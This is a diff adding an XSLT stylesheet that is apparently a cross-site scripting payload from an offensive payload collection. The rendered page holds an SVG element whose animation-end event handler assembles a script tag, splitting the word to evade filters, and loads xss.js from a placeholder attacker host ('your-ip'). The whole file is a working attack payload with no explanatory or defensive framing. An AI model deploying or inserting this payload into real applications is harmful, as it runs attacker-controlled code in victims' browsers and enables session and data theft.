@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+<html>
+<head><style>@keyframes x{}</style></head>
+<body>
+<svg style="animation-name:x" onanimationend="s=createElement('scr'+'ipt');body.appendChild(s);s.src='https://your-ip/xss.js';"></svg>
+</body></html>
+</xsl:template>
+</xsl:stylesheet>
